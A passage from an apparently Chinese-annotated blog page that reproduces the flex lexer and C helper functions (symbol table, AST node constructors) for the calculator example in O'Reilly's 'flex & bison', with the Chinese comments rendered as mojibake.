class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">$ cat fb3<span class="number">-2.</span>l</span><br><span class="line"><span class="comment">/* Companion source code for "flex &amp; bison", published by O'Reilly</span></span><br><span class="line"><span class="comment"> * Media, ISBN 978-0-596-15597-1</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2009, Taughannock Networks. All rights reserved.</span></span><br><span class="line"><span class="comment"> * See the README file for license conditions and contact info.</span></span><br><span class="line"><span class="comment"> * $Header: /home/johnl/flnb/code/RCS/fb3-2.l,v 2.1 2009/11/08 02:53:18 johnl Exp $</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* recognize tokens for the calculator */</span></span><br><span class="line"></span><br><span class="line">%option noyywrap nodefault yylineno</span><br><span class="line">%&#123;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">"fb3-2.h"</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">"fb3-2.tab.h"</span></span></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* float exponent */</span> æµ®ç‚¹æ•°ï¼Œeå¼€å¤´ï¼Œæ­£è´Ÿï¼Œè¿™æ˜¯æŒ‡æ•°éƒ¨åˆ†</span><br><span class="line">EXP    ([Ee][-+]?[<span class="number">0</span><span class="number">-9</span>]+)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ“ä½œç¬¦å•æ“ä½œæ•°</span></span><br><span class="line">%%</span><br><span class="line"> <span class="comment">/* single character ops */</span></span><br><span class="line"><span class="string">"+"</span> |</span><br><span class="line"><span class="string">"-"</span> |</span><br><span class="line"><span class="string">"*"</span> |</span><br><span class="line"><span class="string">"/"</span> |</span><br><span class="line"><span class="string">"="</span> |</span><br><span class="line"><span class="string">"|"</span> |</span><br><span class="line"><span class="string">","</span> |</span><br><span class="line"><span class="string">";"</span> |</span><br><span class="line"><span class="string">"("</span> |</span><br><span class="line"><span class="string">")"</span>     &#123; <span class="keyword">return</span> yytext[<span class="number">0</span>]; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//åŒæ“ä½œæ•°æ“ä½œç¬¦</span></span><br><span class="line"> <span class="comment">/* comparison ops */</span></span><br><span class="line"><span class="string">"&gt;"</span>     &#123; yylval.fn = <span class="number">1</span>; <span class="keyword">return</span> CMP; &#125;</span><br><span class="line"><span class="string">"&lt;"</span>     &#123; yylval.fn = <span class="number">2</span>; <span class="keyword">return</span> CMP; &#125;</span><br><span class="line"><span class="string">"&lt;&gt;"</span>    &#123; yylval.fn = <span class="number">3</span>; <span class="keyword">return</span> CMP; &#125;</span><br><span class="line"><span class="string">"=="</span>    &#123; yylval.fn = <span class="number">4</span>; <span class="keyword">return</span> CMP; &#125;</span><br><span class="line"><span class="string">"&gt;="</span>    &#123; yylval.fn = <span class="number">5</span>; <span class="keyword">return</span> CMP; &#125;</span><br><span class="line"><span class="string">"&lt;="</span>    &#123; yylval.fn = <span class="number">6</span>; <span class="keyword">return</span> CMP; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//å…³é”®å­—</span></span><br><span class="line"> <span class="comment">/* keywords */</span></span><br><span class="line"></span><br><span class="line"><span class="string">"if"</span>    &#123; <span class="keyword">return</span> IF; &#125;</span><br><span class="line"><span class="string">"then"</span>  &#123; <span class="keyword">return</span> THEN; &#125;</span><br><span class="line"><span class="string">"else"</span>  &#123; <span class="keyword">return</span> ELSE; &#125;</span><br><span class="line"><span class="string">"while"</span> &#123; <span class="keyword">return</span> WHILE; &#125;</span><br><span class="line"><span class="string">"do"</span>    &#123; <span class="keyword">return</span> DO; &#125;</span><br><span class="line"><span class="string">"let"</span>   &#123; <span class="keyword">return</span> LET;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å†…å»ºçš„ä¸€äº›å‡½æ•°</span></span><br><span class="line"> <span class="comment">/* built in functions */</span></span><br><span class="line"><span class="string">"sqrt"</span>  &#123; yylval.fn = B_sqrt; <span class="keyword">return</span> FUNC; &#125;</span><br><span class="line"><span class="string">"exp"</span>   &#123; yylval.fn = B_exp; <span class="keyword">return</span> FUNC; &#125;</span><br><span class="line"><span class="string">"log"</span>   &#123; yylval.fn = B_log; <span class="keyword">return</span> FUNC; &#125;</span><br><span class="line"><span class="string">"print"</span> &#123; yylval.fn = B_print; <span class="keyword">return</span> FUNC; &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* debug hack */</span></span><br><span class="line"><span class="string">"debug"</span>[<span class="number">0</span><span class="number">-9</span>]+ &#123; debug = atoi(&amp;yytext[<span class="number">5</span>]); <span class="built_in">printf</span>(<span class="string">"debug set to %d\n"</span>, debug); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å£°æ˜çš„å‡½æ•°çš„å‡½æ•°åï¼Œå­—æ¯å¼€å¤´</span></span><br><span class="line"> <span class="comment">/* names */</span></span><br><span class="line">[a-zA-Z][a-zA-Z0<span class="number">-9</span>]*  &#123; yylval.s = lookup(yytext); <span class="keyword">return</span> NAME; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æµ®ç‚¹æ•°</span></span><br><span class="line">[<span class="number">0</span><span class="number">-9</span>]+<span class="string">"."</span>[<span class="number">0</span><span class="number">-9</span>]*&#123;EXP&#125;? |</span><br><span class="line"><span class="string">"."</span>?[<span class="number">0</span><span class="number">-9</span>]+&#123;EXP&#125;? &#123; yylval.d = atof(yytext); <span class="keyword">return</span> NUMBER; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å…¶ä»–çš„ç¬¦å·</span></span><br><span class="line"><span class="string">"//"</span>.*</span><br><span class="line">[ \t]   <span class="comment">/* ignore white space */</span></span><br><span class="line">\\\<span class="function">n    <span class="title">printf</span><span class="params">(<span class="string">"c&gt; "</span>)</span></span>; <span class="comment">/* ignore line continuation */</span></span><br><span class="line"><span class="string">"\n"</span>    &#123; <span class="keyword">return</span> EOL; &#125;</span><br><span class="line"></span><br><span class="line">.    &#123; yyerror(<span class="string">"Mystery character %c\n"</span>, *yytext); &#125;</span><br><span class="line">%%</span><br></pre></td></tr></table></figure>
<h5 id="å‡½æ•°å®ç°ï¼Œæ„é€ astä»€ä¹ˆçš„ï¼š"><a href="#å‡½æ•°å®ç°ï¼Œæ„é€ astä»€ä¹ˆçš„ï¼š" class="headerlink" title="å‡½æ•°å®ç°ï¼Œæ„é€ astä»€ä¹ˆçš„ï¼š"></a>å‡½æ•°å®ç°ï¼Œæ„é€ astä»€ä¹ˆçš„ï¼š</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br></pre></td><td class="code"><pre><span class="line">$ cat fb3<span class="number">-2</span>funcs.c</span><br><span class="line"><span class="comment">/* Companion source code for "flex &amp; bison", published by O'Reilly</span></span><br><span class="line"><span class="comment"> * Media, ISBN 978-0-596-15597-1</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2009, Taughannock Networks. All rights reserved.</span></span><br><span class="line"><span class="comment"> * See the README file for license conditions and contact info.</span></span><br><span class="line"><span class="comment"> * $Header: /home/johnl/flnb/code/RCS/fb3-2funcs.c,v 2.1 2009/11/08 02:53:18 johnl Exp $</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * helper functions for fb3-2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">"fb3-2.h"</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿™äº›æ˜¯è¾…åŠ©å‡½æ•°ï¼šæ„é€ ç¬¦å·è¡¨ã€hashç®—æ³•ã€æŸ¥æ‰¾</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* symbol table */</span></span><br><span class="line"><span class="comment">/* hash a symbol */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span></span><br><span class="line">symhash(<span class="keyword">char</span> *sym)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> c;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(c = *sym++) hash = hash*<span class="number">9</span> ^ c;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> symbol *</span><br><span class="line">lookup(<span class="keyword">char</span>* sym)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> symbol *sp = &amp;symtab[symhash(sym)%NHASH];</span><br><span class="line">  <span class="keyword">int</span> scount = NHASH;        <span class="comment">/* how many have we looked at */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(--scount &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(sp-&gt;name &amp;&amp; !<span class="built_in">strcmp</span>(sp-&gt;name, sym)) &#123; <span class="keyword">return</span> sp; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!sp-&gt;name) &#123;        <span class="comment">/* new entry */</span></span><br><span class="line">      sp-&gt;name = strdup(sym);</span><br><span class="line">      sp-&gt;value = <span class="number">0</span>;</span><br><span class="line">      sp-&gt;func = <span class="literal">NULL</span>;</span><br><span class="line">      sp-&gt;syms = <span class="literal">NULL</span>;</span><br><span class="line">      <span class="keyword">return</span> sp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(++sp &gt;= symtab+NHASH) sp = symtab; <span class="comment">/* try the next entry */</span></span><br><span class="line">  &#125;</span><br><span class="line">  yyerror(<span class="string">"symbol table overflow\n"</span>);</span><br><span class="line">  <span class="built_in">abort</span>(); <span class="comment">/* tried them all, table is full */</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿™æ˜¯æ„é€ astçš„å‡½æ•°ï¼Œæ ¹æ®å‚æ•°ï¼Œå¡«å……astçš„ç»“æ„ã€‚</span></span><br><span class="line"><span class="comment">//å¡«å…… typeï¼ŒèŠ‚ç‚¹ä»€ä¹ˆçš„</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> ast *</span><br><span class="line">newast(<span class="keyword">int</span> nodetype, <span class="keyword">struct</span> ast *l, <span class="keyword">struct</span> ast *r)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> ast *a = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ast));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">"out of space"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a-&gt;nodetype = nodetype;</span><br><span class="line">  a-&gt;l = l;</span><br><span class="line">  a-&gt;r = r;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//numberçš„ast</span></span><br><span class="line"><span class="keyword">struct</span> ast *</span><br><span class="line">newnum(<span class="keyword">double</span> d)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> numval *a = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> numval));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">"out of space"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a-&gt;nodetype = <span class="string">'K'</span>;</span><br><span class="line">  a-&gt;number = d;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">struct</span> ast *)a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ¯”è¾ƒè¡¨è¾¾å¼çš„ast</span></span><br><span class="line"><span class="keyword">struct</span> ast *</span><br><span class="line">newcmp(<span class="keyword">int</span> cmptype, <span class="keyword">struct</span> ast *l, <span class="keyword">struct</span> ast *r)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> ast *a = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ast));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">"out of space"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a-&gt;nodetype = <span class="string">'0'</span> + cmptype;</span><br><span class="line">  a-&gt;l = l;</span><br><span class="line">  a-&gt;r = r;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å‡½æ•°çš„ast</span></span><br><span class="line"><span class="keyword">struct</span> ast *</span><br><span class="line">newfunc(<span class="keyword">int</span> functype, <span class="keyword">struct</span> ast *l)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> fncall *a = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> fncall));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">"out of space"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a-&gt;nodetype = <span class="string">'F'</span>;</span><br><span class="line">  a-&gt;l = l;</span><br><span class="line">  a-&gt;functype = functype;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">struct</span> ast *)a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è°ƒç”¨çš„ast</span></span><br><span class="line"><span class="comment">// call funcname();è¿™ç§</span></span><br><span class="line"><span class="keyword">struct</span> ast *</span><br><span class="line">newcall(<span class="keyword">struct</span> symbol *s, <span class="keyword">struct</span> ast *l)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> ufncall *a = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ufncall));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">"out of space"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a-&gt;nodetype = <span class="string">'C'</span>;</span><br><span class="line">  a-&gt;l = l;</span><br><span class="line">  a-&gt;s = s;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">struct</span> ast *)a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¼•ç”¨çš„ast</span></span><br><span class="line"><span class="keyword">struct</span> ast *</span><br><span class="line">newref(<span class="keyword">struct</span> symbol *s)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> symref *a = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> symref));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">"out of space"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a-&gt;nodetype = <span class="string">'N'</span>;</span><br><span class="line">  a-&gt;s = s;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">struct</span> ast *)a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//èµ‹å€¼è¡¨è¾¾å¼ ast</span></span><br><span class="line"><span class="keyword">struct</span> ast *</span><br><span class="line">newasgn(<span class="keyword">struct</span> symbol *s, <span class="keyword">struct</span> ast *v)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> symasgn *a = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> symasgn));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">"out of space"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a-&gt;nodetype = <span class="string">'='</span>;</span><br><span class="line">  a-&gt;s = s;</span><br><span class="line">  a-&gt;v = v;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">struct</span> ast *)a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 